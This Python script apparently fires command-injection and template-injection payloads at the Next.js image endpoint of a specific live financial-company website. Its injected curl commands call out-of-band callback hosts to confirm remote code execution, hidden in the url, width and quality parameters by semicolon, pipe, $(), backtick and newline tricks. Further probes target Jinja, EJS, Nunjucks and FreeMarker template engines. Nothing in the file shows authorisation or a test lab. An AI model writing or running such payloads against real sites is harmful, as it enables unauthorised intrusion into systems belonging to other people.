import requests, os, time, urllib.parse
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
CM = "oobd843b6015e60.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SS = "oobdb02ae588326.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
GOOD = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
Q = urllib.parse.quote(GOOD, safe='')
CMH="http://"+CM

def fire(lab, path, timeout=40):
    try:
        r=requests.get(T+path, headers=H, timeout=timeout, allow_redirects=False)
        print(" %-24s %s len=%d %s" % (lab, r.status_code, len(r.content), r.text[:90].replace('\n',' ') if len(r.content)<2000 else r.headers.get('content-type')))
    except Exception as e: print(" %-24s ERR %s"%(lab,e))

print("### CMDi payloads on /_next/image")
fire("semicolon", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/x.jpg;curl+http://"+CM+"/cmdi1", safe='')+"&w=640&q=75")
fire("pipe",      "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/x.jpg|curl http://"+CM+"/cmdi2", safe='')+"&w=640&q=75")
fire("dollar-paren","/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/$(curl http://"+CM+"/cmdi3).jpg", safe='')+"&w=640&q=75")
fire("backtick-q", "/_next/image?url="+Q+"&w=640&q=%60curl%20http%3A%2F%2F"+CM+"/cmdi4%60")
fire("newline",   "/_next/image?url="+Q+"%0acurl%20http://"+CM+"/cmdi5"+"&w=640&q=75")
fire("w-cmdi",    "/_next/image?url="+Q+"&w=640;curl%20http://"+CM+"/cmdi6&q=75")
fire("q-cmdi",    "/_next/image?url="+Q+"&w=640&q=75;curl%20http://"+CM+"/cmdi7")

print("\n### SSTI payloads on /_next/image")
fire("jinja w",     "/_next/image?url="+Q+"&w=%7B%7B7*7%7D%7D&q=75")
fire("jinja url",   "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/{{7*7}}.jpg", safe='')+"&w=640&q=75")
fire("ejs w",       "/_next/image?url="+Q+"&w=${7*7}&q=75")
fire("ejs q",       "/_next/image?url="+Q+"&w=640&q=${7*7}")
fire("nunjucks",    "/_next/image?url="+Q+"&w=640&q=%7B%7Brange(10)%7D%7D")
fire("freemarker",  "/_next/image?url="+Q+"&w=640&q=${7*'7'}")
fire("jinja url 2", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/"+SS+"/x.jpg", safe='')+"&w=640&q=75")
fire("jinja url 3", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/{{request}}.jpg", safe='')+"&w=640&q=75")
